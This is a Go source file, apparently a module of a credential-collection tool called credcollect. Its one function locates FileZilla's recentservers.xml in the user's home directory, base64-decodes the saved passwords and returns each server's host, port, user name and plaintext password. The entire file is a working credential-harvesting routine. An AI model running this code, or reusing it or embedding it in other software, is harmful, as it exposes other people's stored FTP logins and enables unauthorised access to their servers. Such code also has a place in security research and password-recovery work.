package filezilla

import (
	"encoding/base64"
	"encoding/xml"
	"io/ioutil"
	"os"
	"path/filepath"

	"github.com/404tk/credcollect/common"
	"github.com/404tk/credcollect/common/utils"
)

func FileZilla() []common.FileZillaPassWord {
	ret := []common.FileZillaPassWord{}
	// https://stackoverflow.com/questions/10137154/recovering-saved-password-in-filezilla
	filename, err := utils.GetItemPath(filepath.Join(os.Getenv("HOME"), "/.config/filezilla/"), "recentservers.xml")
	if err != nil {
		filename, err = utils.GetItemPath(filepath.Join(os.Getenv("HOME"), "/.filezilla/"), "recentservers.xml")
		if err != nil {
			return ret
		}
	}
	file, err := os.Open(filename)
	if err != nil {
		return ret
	}
	defer file.Close()
	data, err := ioutil.ReadAll(file)
	if err != nil {
		return ret
	}

	v := FileZillaXML{}
	err = xml.Unmarshal(data, &v)
	if err != nil {
		return ret
	}

	for _, s := range v.RecentServers.Server {
		if s.Host != "" {
			var pwd string
			pass, err := base64.StdEncoding.DecodeString(s.Pass)
			if err == nil {
				pwd = string(pass)
			}
			if len(pwd) > 0 {
				ret = append(ret, common.FileZillaPassWord{
					HostName:   s.Host,
					PortNumber: s.Port,
					UserName:   s.User,
					PassWord:   pwd,
				})
			}
		}
	}
	return ret
}
